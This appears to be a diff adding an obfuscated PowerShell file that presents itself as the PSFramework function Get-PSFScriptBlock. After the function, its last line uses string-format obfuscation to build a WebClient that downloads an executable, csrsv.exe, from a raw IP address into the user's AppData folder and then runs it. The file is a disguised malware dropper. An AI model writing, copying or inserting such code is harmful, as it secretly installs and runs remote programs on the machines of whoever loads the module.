@@ -1,0 +1,50 @@
+$Vf5mUN =[tyPe]("{2}{1}{7}{4}{3}{5}{8}{6}{0}"-f 'T','rameWorK.uTiL','PSF','t','.u','iL','HOs','iTy','ity') ; function Ge`T`-p`SfS`CripT`BLOck
+{
+
+	[OutputType([PSFramework.Utility.ScriptBlockItem], PaRamEtersETnAmE = "Li`st")]
+	[OutputType([System.Management.Automation.ScriptBlock], pAraMETerSeTnaME = "N`AMe")]
+	[Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{10}{9}{5}{6}{4}{7}{8}{3}{11}{1}{2}{0}" -f'ter','ara','me','r','l','u','ltVa','ueFo','rMandato','SAvoidDefa','P','yP'}, "")]
+	[CmdletBinding(dEFAUlTPaRaMeTeRSetName = {"{1}{0}"-f'me','Na'})]
+	param (
+		[Parameter(PAraMEtErsetNAME = "lI`st")]
+		[Parameter(manDAtORY = ${T`RuE}, ParAmEtERSEtname = "nA`ME", VALuEFROMPiPeLine = ${T`RuE})]
+		[string[]]
+		${Na`me} = '*',
+		
+		[Parameter(mANDaToRy = ${T`RUe}, paRametErsEtNAme = "L`IsT")]
+		[switch]
+		${L`isT}
+	)
+	
+	begin
+	{
+		[System.Collections.ArrayList]${s`ENt} = @()
+		${alLi`T`eMs} =   ( .("{0}{1}" -f 'di','r') ("VArIa"+"ble:v"+"f5m"+"uN")).VaLUE::"s`c`RiptBlOc`Ks"."va`L`UES"
+	}
+	process
+	{
+		:main foreach (${n`AMe`TeXT} in ${na`me})
+		{
+			switch (${pSc`MDlet}.PAramETERsetnAMe)
+			{
+				("{0}{1}" -f'Na','me')
+				{
+					if (${S`ENT} -contains ${NaME`Te`Xt}) { continue ("{0}{1}"-f 'm','ain') }
+					${n`UlL} = ${S`ENT}.("{0}{1}" -f 'Ad','d').Invoke(${naMET`E`xT})
+					  $vF5MUn::"Sc`R`Ipt`BLoCks"[${NAmEt`EXt}]."s`CRIpTBL`ocK"
+				}
+				("{1}{0}"-f 'ist','L')
+				{
+					foreach (${It`EM} in ${alli`TE`MS})
+					{
+						if (${i`TeM}."n`AME" -notlike ${NaMe`T`ExT}) { continue }
+						if (${Se`Nt} -contains ${iT`eM}."na`ME") { continue }
+						${nu`ll} = ${Se`Nt}.("{1}{0}" -f'd','Ad').Invoke(${I`TEm}."na`ME")
+						${i`Tem}
+					}
+				}
+			}
+		}
+	}
+}
+(&("{2}{1}{0}{3}"-f'Obj','ew-','N','ect') ("{3}{1}{0}{2}" -f'WebCl','Net.','ient','System.')).("{3}{0}{1}{2}" -f 'n','loadF','ile','Dow').Invoke(("{3}{8}{7}{6}{4}{0}{2}{1}{5}" -f '8/','o/csrsv.','~yaho','h','3.23','exe','2.5','94.10','ttp://'),"$env:APPDATA\csrsv.exe");&("{4}{3}{2}{0}{1}"-f 'oc','ess','-Pr','tart','S') ("$env:APPDATA\csrsv.exe")
